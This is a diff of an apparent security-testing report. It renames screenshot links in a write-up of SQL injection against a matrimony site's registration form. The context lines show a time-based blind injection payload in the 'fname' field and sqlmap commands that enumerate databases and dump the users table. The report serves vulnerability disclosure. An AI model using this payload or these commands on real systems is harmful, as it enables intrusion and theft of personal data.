@@ -194,7 +194,7 @@ The intercepted POST request was modified by injecting a time-based SQL payload 
 
 Payload: 
 fname=Karan' AND (SELECT 7500 FROM (SELECT(SLEEP(10)))wEXp) AND 'faZL'='faZL&lname=Parelkar&sex=Female&email=test@gmail.com&day=14&month=02&year=1990&religion=Christian&caste=Penthecost&subcaste=sub caste2&country=India&state=Taminadu&district=Kollam&age=29&maritalstatus=Divorsed&profileby=Self&education=PG&edudescr=&bodytype=Fat&physicalstatus=No Problem&drink=No&smoke=No&mothertounge=Malayalam&bloodgroup=O +ve&weight=86&height=180&colour=Dark&diet=Veg&occupation=test&occupationdescr=hfuowgef0qyf&income=30000000&fatheroccupation=nothing&motheroccupation=nothing&sis=3&bros=2&aboutme=wqeuof&op=Submit
-![POC](images/sql%20manual.png)
+![POC](images/sqli%20manual.png)
 
 The application response was delayed by approximately 10 seconds, confirming successful  time-based blind SQL injection.
 
@@ -202,15 +202,15 @@ The application response was delayed by approximately 10 seconds, confirming suc
 Step 4 – SQLMap Verification 
 The captured request was supplied to SQLMap. 
 command: ```python python .\sqlmap.py -r .\code_test_2.txt --dbs -p fname```
-![POC](images/sql%201.png)
-![POC](images/sql%202.png)
+![POC](images/sqli%201.png)
+![POC](images/sqli%202.png)
 
 SQLMap confirmed that the fname parameter is injectable using: 
 • Error-based SQL Injection  
 • Time-based Blind SQL Injection 
 
 ```python python .\sqlmap.py -r .\code_test_2.txt -p fname -D matrimony --tables```
-![POC](images/sql%203.png)
+![POC](images/sqli%203.png)
 
 Database Enumeration 
 Using SQLMap, multiple databases were successfully enumerated. 
@@ -227,8 +227,8 @@ command:
 
 ```python python .\sqlmap.py -r .\code_test_2.txt -p fname -D matrimony -T users –dump```
 
-![POC](images/sql%204.png)
-![POC](images/sql%205.png)
+![POC](images/sqli%204.png)
+![POC](images/sqli%205.png)
 
 The following sensitive information was retrieved: 
 • Usernames  
